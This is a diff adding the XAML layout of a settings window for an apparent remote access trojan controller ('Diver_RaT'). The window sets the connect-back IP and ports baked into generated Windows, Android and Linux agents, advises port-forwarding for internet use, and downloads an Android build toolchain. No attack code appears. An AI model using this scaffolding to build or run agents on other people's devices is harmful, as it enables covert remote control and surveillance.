@@ -1,0 +1,245 @@
+<Window x:Class="Diver_RaT.SettingsWindow"
+        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
+        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+        xmlns:shell="clr-namespace:System.Windows.Shell;assembly=PresentationFramework"
+        xmlns:ui="clr-namespace:Diver_RaT"
+        Title="Settings" Width="980" Height="720"
+        WindowStartupLocation="CenterOwner" ResizeMode="NoResize"
+        WindowStyle="None"
+        Background="{StaticResource WindowBgBrush}"
+        Foreground="#E6E8EF">
+
+    <WindowChrome.WindowChrome>
+        <WindowChrome CaptionHeight="0" GlassFrameThickness="1" ResizeBorderThickness="6"
+                      CornerRadius="8" UseAeroCaptionButtons="False"/>
+    </WindowChrome.WindowChrome>
+
+    <Window.Resources>
+        <Style x:Key="SectionLabel" TargetType="TextBlock">
+            <Setter Property="FontSize" Value="13"/>
+            <Setter Property="FontWeight" Value="SemiBold"/>
+            <Setter Property="Foreground" Value="{StaticResource LimeSoftBrush}"/>
+            <Setter Property="Margin" Value="0,0,0,6"/>
+        </Style>
+        <Style x:Key="CardLabel" TargetType="TextBlock">
+            <Setter Property="FontSize" Value="13"/>
+            <Setter Property="FontWeight" Value="SemiBold"/>
+            <Setter Property="Foreground" Value="{StaticResource LimeSoftBrush}"/>
+        </Style>
+        <Style x:Key="CardSub" TargetType="TextBlock">
+            <Setter Property="FontSize" Value="11"/>
+            <Setter Property="Foreground" Value="{StaticResource MutedBrush}"/>
+        </Style>
+        <Style x:Key="FieldLabel" TargetType="TextBlock">
+            <Setter Property="FontSize" Value="11"/>
+            <Setter Property="Foreground" Value="{StaticResource MutedBrush}"/>
+            <Setter Property="Margin" Value="0,0,0,4"/>
+        </Style>
+        <Style x:Key="ToolButton" TargetType="Button" BasedOn="{StaticResource {x:Type Button}}">
+            <Setter Property="Width" Value="120"/>
+            <Setter Property="Height" Value="30"/>
+        </Style>
+    </Window.Resources>
+
+    <Grid>
+        <Grid.RowDefinitions>
+            <RowDefinition Height="Auto"/>
+            <RowDefinition Height="Auto"/>
+            <RowDefinition Height="*"/>
+            <RowDefinition Height="Auto"/>
+        </Grid.RowDefinitions>
+
+        <ui:CustomTitleBar Grid.Row="0" Title="Settings"/>
+
+        <Border Grid.Row="1" Background="{StaticResource HeaderGlassBrush}"
+                BorderBrush="{StaticResource GlassBorderBrush}" BorderThickness="0,0,0,1"
+                Padding="24,16">
+            <StackPanel Orientation="Horizontal">
+                <Border Width="14" Height="14" CornerRadius="4"
+                        Background="{StaticResource LimeBrush}" Margin="0,0,10,0" VerticalAlignment="Center"/>
+                <StackPanel>
+                    <TextBlock Text="System Setup &amp; Android Build Configuration" FontSize="16" FontWeight="Bold"
+                               Foreground="{StaticResource LimeBrush}"/>
+                    <TextBlock Text="Bundle the JDK, Android SDK and Gradle inside this app so it stays configured on any machine."
+                               FontSize="11" Foreground="{StaticResource MutedBrush}"/>
+                </StackPanel>
+            </StackPanel>
+        </Border>
+
+        <Grid Grid.Row="2" Margin="24,18,24,18">
+            <Grid.ColumnDefinitions>
+                <ColumnDefinition Width="*"/>
+                <ColumnDefinition Width="16"/>
+                <ColumnDefinition Width="330"/>
+            </Grid.ColumnDefinitions>
+
+            <ScrollViewer Grid.Column="0" VerticalScrollBarVisibility="Auto">
+                <StackPanel>
+
+                    <TextBlock Text="AGENT CONNECT-BACK ENDPOINT" Style="{StaticResource SectionLabel}" Width="542"/>
+                    <Border Background="{StaticResource PanelGlassBrush}"
+                            BorderBrush="{StaticResource GlassBorderBrush}" BorderThickness="1"
+                            CornerRadius="8" Padding="14,12" Margin="0,0,0,18" Width="544">
+                        <StackPanel>
+                        <TextBlock Style="{StaticResource CardSub}" TextWrapping="Wrap" Margin="0,0,0,10">
+                            The IP / hostname and base port used by the listeners and embedded into generated
+                            agents. Windows agents connect to this port,
+                            <Run Foreground="{StaticResource LimeSoftBrush}" FontWeight="SemiBold">Android to port + 1</Run>, and
+                            <Run Foreground="{StaticResource LimeSoftBrush}" FontWeight="SemiBold">Linux to port + 2</Run>.
+                            For internet use, set your
+                            <Run Foreground="{StaticResource LimeSoftBrush}" FontWeight="SemiBold">public IP (or DDNS hostname)</Run>
+                            and port-forward this port (plus +1/+2) on your router to this controller.
+                            Listeners re-bind automatically when you Save.
+                        </TextBlock>
+                            <Grid>
+                                <Grid.ColumnDefinitions>
+                                    <ColumnDefinition Width="*"/>
+                                    <ColumnDefinition Width="16"/>
+                                    <ColumnDefinition Width="130"/>
+                                    <ColumnDefinition Width="12"/>
+                                    <ColumnDefinition Width="Auto"/>
+                                </Grid.ColumnDefinitions>
+                                <StackPanel Grid.Column="0">
+                                    <TextBlock Text="Controller IP / hostname" Style="{StaticResource FieldLabel}"/>
+                                    <TextBox x:Name="IpTextBox" Height="40"/>
+                                </StackPanel>
+                                <StackPanel Grid.Column="2">
+                                    <TextBlock Text="TCP port" Style="{StaticResource FieldLabel}"/>
+                                    <TextBox x:Name="PortTextBox" Height="40"/>
+                                </StackPanel>
+                                <Button x:Name="SaveEndpointButton" Grid.Column="4" Content="Save"
+                                        Width="90" Height="40" VerticalAlignment="Bottom"
+                                        Click="SaveEndpointButton_Click"/>
+                            </Grid>
+                        </StackPanel>
+                    </Border>
+
+                    <TextBlock Text="BUILD TOOLCHAIN" Style="{StaticResource SectionLabel}" Width="530"/>
+                    <Button x:Name="InstallAllButton" Click="InstallAllButton_Click"
+                            Content="Download &amp; Configure Everything" Height="38" HorizontalAlignment="Stretch"
+                            Margin="0,0,0,4" FontSize="13.5" Width="528"/>
+                    <TextBlock Style="{StaticResource CardSub}" TextWrapping="Wrap" Margin="0,0,0,12"
+                               Text="Downloads JDK 17, the Android SDK (platform-tools, build-tools 35.0.0, android-34), and Gradle 8.14 directly into the app's tools folder. You can close this window while it downloads - it continues in the background."/>
+                    <Border Background="#1F141C12" BorderBrush="{StaticResource GlassBorderBrush}"
+                            BorderThickness="1" CornerRadius="6" Padding="10,8" Margin="0,0,0,18">
+                        <TextBlock Style="{StaticResource CardSub}" TextWrapping="Wrap">
+                            <Run Foreground="{StaticResource LimeSoftBrush}" FontWeight="SemiBold">Linux agents:</Run>
+                            generated as a single-file Python 3 script - no downloads or toolchain needed here. Python 3 ships with every major Linux distro.
+                        </TextBlock>
+                    </Border>
+
+                    <Border Background="{StaticResource PanelGlassBrush}"
+                            BorderBrush="{StaticResource GlassBorderBrush}" BorderThickness="1"
+                            CornerRadius="8" Padding="14,12" Margin="0,0,0,10" Width="534">
+                        <Grid>
+                            <Grid.ColumnDefinitions>
+                                <ColumnDefinition Width="48"/>
+                                <ColumnDefinition Width="*"/>
+                                <ColumnDefinition Width="Auto"/>
+                            </Grid.ColumnDefinitions>
+                            <Border x:Name="JdkDot" Width="14" Height="14" CornerRadius="7"
+                                    Background="{StaticResource DangerBrush}" VerticalAlignment="Center"
+                                    HorizontalAlignment="Left" Margin="6,0,0,0"/>
+                            <StackPanel Grid.Column="1" VerticalAlignment="Center">
+                                <TextBlock Text="JDK 17 (Temurin)" Style="{StaticResource CardLabel}"/>
+                                <TextBlock x:Name="JdkStatusText" Text="Checking..." Style="{StaticResource CardSub}" TextWrapping="Wrap"/>
+                                <TextBlock x:Name="JdkPathText" Text="" Style="{StaticResource CardSub}" TextTrimming="CharacterEllipsis"/>
+                            </StackPanel>
+                            <Button x:Name="JdkButton" Grid.Column="2" Style="{StaticResource ToolButton}"
+                                    Content="Download" Click="JdkButton_Click" VerticalAlignment="Center"/>
+                        </Grid>
+                    </Border>
+
+                    <Border Background="{StaticResource PanelGlassBrush}"
+                            BorderBrush="{StaticResource GlassBorderBrush}" BorderThickness="1"
+                            CornerRadius="8" Padding="14,12" Margin="0,0,0,10" Width="532">
+                        <Grid>
+                            <Grid.ColumnDefinitions>
+                                <ColumnDefinition Width="48"/>
+                                <ColumnDefinition Width="*"/>
+                                <ColumnDefinition Width="Auto"/>
+                            </Grid.ColumnDefinitions>
+                            <Border x:Name="SdkDot" Width="14" Height="14" CornerRadius="7"
+                                    Background="{StaticResource DangerBrush}" VerticalAlignment="Center"
+                                    HorizontalAlignment="Left" Margin="6,0,0,0"/>
+                            <StackPanel Grid.Column="1" VerticalAlignment="Center">
+                                <TextBlock Text="Android SDK" Style="{StaticResource CardLabel}"/>
+                                <TextBlock x:Name="SdkStatusText" Text="Checking..." Style="{StaticResource CardSub}" TextWrapping="Wrap"/>
+                                <TextBlock x:Name="SdkPathText" Text="" Style="{StaticResource CardSub}" TextTrimming="CharacterEllipsis"/>
+                            </StackPanel>
+                            <Button x:Name="SdkButton" Grid.Column="2" Style="{StaticResource ToolButton}"
+                                    Content="Download" Click="SdkButton_Click" VerticalAlignment="Center"/>
+                        </Grid>
+                    </Border>
+
+                    <Border Background="{StaticResource PanelGlassBrush}"
+                            BorderBrush="{StaticResource GlassBorderBrush}" BorderThickness="1"
+                            CornerRadius="8" Padding="14,12" Margin="0,0,0,18" Width="528">
+                        <Grid>
+                            <Grid.ColumnDefinitions>
+                                <ColumnDefinition Width="48"/>
+                                <ColumnDefinition Width="*"/>
+                                <ColumnDefinition Width="Auto"/>
+                            </Grid.ColumnDefinitions>
+                            <Border x:Name="GradleDot" Width="14" Height="14" CornerRadius="7"
+                                    Background="{StaticResource DangerBrush}" VerticalAlignment="Center"
+                                    HorizontalAlignment="Left" Margin="6,0,0,0"/>
+                            <StackPanel Grid.Column="1" VerticalAlignment="Center">
+                                <TextBlock Text="Gradle 8.14" Style="{StaticResource CardLabel}"/>
+                                <TextBlock x:Name="GradleStatusText" Text="Checking..." Style="{StaticResource CardSub}" TextWrapping="Wrap"/>
+                                <TextBlock x:Name="GradlePathText" Text="" Style="{StaticResource CardSub}" TextTrimming="CharacterEllipsis"/>
+                            </StackPanel>
+                            <Button x:Name="GradleButton" Grid.Column="2" Style="{StaticResource ToolButton}"
+                                    Content="Download" Click="GradleButton_Click" VerticalAlignment="Center"/>
+                        </Grid>
+                    </Border>
+
+                    <TextBlock Text="LOCATION" Style="{StaticResource SectionLabel}"/>
+                    <Border Background="#E60C0F0B" BorderBrush="{StaticResource GlassBorderBrush}"
+                            BorderThickness="1" CornerRadius="6" Padding="10,8" Width="522">
+                        <TextBlock x:Name="ToolsPathText" Text="" FontSize="12" Foreground="#E6E8EF" TextWrapping="Wrap"/>
+                    </Border>
+
+                </StackPanel>
+            </ScrollViewer>
+
+            <Border Grid.Column="2" Background="{StaticResource PanelGlassBrush}"
+                    BorderBrush="{StaticResource GlassBorderBrush}" BorderThickness="1"
+                    CornerRadius="8" Padding="12,10">
+                <DockPanel>
+                    <TextBlock DockPanel.Dock="Top" Text="ACTIVITY LOG" Style="{StaticResource SectionLabel}"/>
+                    <TextBox x:Name="LogBox" IsReadOnly="True" AcceptsReturn="True" TextWrapping="Wrap"
+                             VerticalContentAlignment="Top"
+                             VerticalScrollBarVisibility="Auto" FontSize="11.5"
+                             FontFamily="Cascadia Mono, Consolas"/>
+                </DockPanel>
+            </Border>
+        </Grid>
+
+        <Border Grid.Row="3" Background="{StaticResource HeaderGlassBrush}"
+                BorderBrush="{StaticResource GlassBorderBrush}" BorderThickness="0,1,0,0"
+                Padding="20,12">
+            <StackPanel>
+                <ProgressBar x:Name="ProgressBar" Height="6" Minimum="0" Maximum="100"
+                             Foreground="{StaticResource LimeBrush}" Margin="0,0,0,10"/>
+                <Grid>
+                    <Grid.ColumnDefinitions>
+                        <ColumnDefinition Width="*"/>
+                        <ColumnDefinition Width="Auto"/>
+                        <ColumnDefinition Width="10"/>
+                        <ColumnDefinition Width="Auto"/>
+                    </Grid.ColumnDefinitions>
+                    <TextBlock x:Name="ProgressText" Grid.Column="0" Text="Ready" FontSize="11"
+                               Foreground="{StaticResource MutedBrush}" VerticalAlignment="Center"
+                               TextTrimming="CharacterEllipsis" MaxWidth="600"/>
+                    <Button x:Name="CancelButton" Grid.Column="1" Content="Cancel Download" Width="120" Height="32"
+                            Style="{StaticResource DangerButtonStyle}" Click="CancelButton_Click" IsEnabled="False"/>
+                    <Button Grid.Column="3" Content="Close" Width="90" Height="32" Click="CloseButton_Click" IsCancel="True"/>
+                </Grid>
+            </StackPanel>
+        </Border>
+
+        <Border CornerRadius="8" BorderBrush="{StaticResource WindowFrameBrush}" BorderThickness="2"
+                Panel.ZIndex="9999" Grid.RowSpan="4" IsHitTestVisible="False"/>
+    </Grid>
+</Window>
